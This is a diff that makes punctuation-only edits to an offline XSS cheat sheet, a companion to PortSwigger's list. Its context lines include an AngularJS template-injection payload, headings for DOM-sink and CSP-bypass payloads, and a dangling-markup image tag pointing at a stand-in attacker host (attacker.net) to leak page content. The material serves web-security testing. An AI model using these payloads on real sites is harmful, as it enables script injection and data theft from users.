@@ -1,6 +1,6 @@
-# Cross-Site Scripting (XSS) — Cheat Sheet
+# Cross-Site Scripting (XSS) Cheat Sheet
 Companion to PortSwigger's interactive cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-(That page is a filterable, auto-updated vector list — use it live for filter-bypass fuzzing.
+(That page is a filterable, auto-updated vector list: use it live for filter-bypass fuzzing.
 This file is a static, offline-usable reference organized by the situation you're in.)
 
 ---
@@ -85,7 +85,7 @@ Then navigate/redirect so the element gets focus (`location = url + '#x'`), trig
 {{constructor.constructor('alert(1)')()}}
 ```
 If quotes are blocked, string-free variants and CSP-bypass variants exist on PortSwigger's
-live cheat sheet under "AngularJS" filters — copy the exact vector from there since it is
+live cheat sheet under "AngularJS" filters, copy the exact vector from there since it is
 regularly updated as browsers change.
 
 ## 10. DOM XSS — sink-specific payloads
@@ -142,7 +142,7 @@ or, avoiding CORS issues entirely:
 ```
 Useful against strict CSPs that block `script-src` but not `style-src`.
 
-## 14. Dangling markup (no JS execution needed — bypasses most CSPs)
+## 14. Dangling markup (no JS execution needed, bypasses most CSPs)
 
 ```html
 <img src="https://attacker.net/log?
